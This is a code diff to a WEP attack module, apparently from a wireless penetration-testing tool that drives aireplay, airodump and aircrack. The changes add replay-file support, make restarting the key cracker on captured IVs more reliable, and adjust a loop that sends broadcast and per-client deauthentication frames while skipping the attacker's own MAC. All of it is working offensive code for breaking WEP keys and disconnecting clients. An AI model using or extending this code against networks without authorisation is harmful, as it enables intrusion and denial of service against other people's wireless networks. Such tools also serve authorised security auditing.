@@ -77,7 +77,8 @@ class AttackWEP(Attack):
                     # Start Aireplay process.
                     aireplay = Aireplay(self.target,
                                         wep_attack_type,
-                                        client_mac=client_mac)
+                                        client_mac=client_mac,
+                                        replay_file=replay_file)
 
                     time_unchanged_ivs = time.time() # Timestamp when IVs last changed
                     previous_ivs = 0
@@ -90,7 +91,9 @@ class AttackWEP(Attack):
                         if client_mac is None and len(airodump_target.clients) > 0:
                             client_mac = airodump_target.clients[0].station
 
-                        status = "%d/{C}%d{W} IVs" % (airodump_target.ivs, Configuration.wep_crack_at_ivs)
+                        total_ivs = airodump_target.ivs
+
+                        status = "%d/{C}%d{W} IVs" % (total_ivs, Configuration.wep_crack_at_ivs)
                         if fakeauth_proc:
                             if fakeauth_proc and fakeauth_proc.status:
                                 status += ", {G}fakeauth{W}"
@@ -123,28 +126,31 @@ class AttackWEP(Attack):
                             Color.p("and {C}cracking{W}")
 
                         # Check number of IVs, crack if necessary
-                        if airodump_target.ivs > Configuration.wep_crack_at_ivs:
+                        if total_ivs > Configuration.wep_crack_at_ivs:
                             if not aircrack:
                                 # Aircrack hasn't started yet. Start it.
-                                ivs_file = airodump.find_files(endswith='.ivs')[0]
-                                aircrack = Aircrack(ivs_file)
+                                ivs_files = airodump.find_files(endswith='.ivs')
+                                if len(ivs_files) > 0:
+                                    aircrack = Aircrack(ivs_files[-1])
 
                             elif not aircrack.is_running():
                                 # Aircrack stopped running.
-                                Color.pl('\n{!} {O}aircrack stopped running!{W}')
-                                ivs_file = airodump.find_files(endswith='.ivs')[0]
-                                Color.pl('{+} {C}aircrack{W} stopped, restarting...')
-                                self.fake_auth()
-                                aircrack = Aircrack(ivs_file)
+                                #Color.pl('\n{+} {C}aircrack{W} stopped, restarting...')
+                                ivs_files = airodump.find_files(endswith='ivs')
+                                if len(ivs_files) > 0:
+                                    aircrack = Aircrack(ivs_files[-1])
+                                # TODO: Why do we need fakeauth when aircrack stops?
+                                #self.fake_auth()
 
                             '''
                             elif Configuration.wep_restart_aircrack > 0 and \
                                     aircrack.pid.running_time() > Configuration.wep_restart_aircrack:
                                 # Restart aircrack after X seconds
                                 aircrack.stop()
-                                ivs_file = airodump.find_files(endswith='.ivs')[0]
+                                ivs_files = airodump.find_files(endswith='.ivs')
                                 Color.pl('\n{+} {C}aircrack{W} ran for more than {C}%d{W} seconds, restarting' % Configuration.wep_restart_aircrack)
-                                aircrack = Aircrack(ivs_file)
+                                if len(ivs_files) > 0:
+                                    aircrack = Aircrack(ivs_files[-1])
                             '''
 
 
@@ -277,15 +283,24 @@ class AttackWEP(Attack):
             # Deauth clients & retry
             deauth_count = 1
             Color.clear_entire_line()
+
             Color.p("\r{+} {O}Deauthenticating *broadcast*{W} (all clients)...")
             Aireplay.deauth(target.bssid, essid=target.essid)
+
+            attacking_mac = Ifconfig.get_mac(Configuration.interface)
             for client in target.clients:
+                if attacking_mac.lower() == client.station.lower():
+                    continue  # Don't deauth ourselves.
+
                 Color.clear_entire_line()
                 Color.p("\r{+} {O}Deauthenticating client {C}%s{W}..." % client.station)
+
                 Aireplay.deauth(target.bssid, client_mac=client.station, essid=target.essid)
                 deauth_count += 1
+
             Color.clear_entire_line()
             Color.pl("\r{+} Sent {C}%d {O}deauths{W}" % deauth_count)
+
             # Re-insert current attack to top of list of attacks remaining
             attacks_remaining.insert(0, current_attack)
             return False # Don't stop
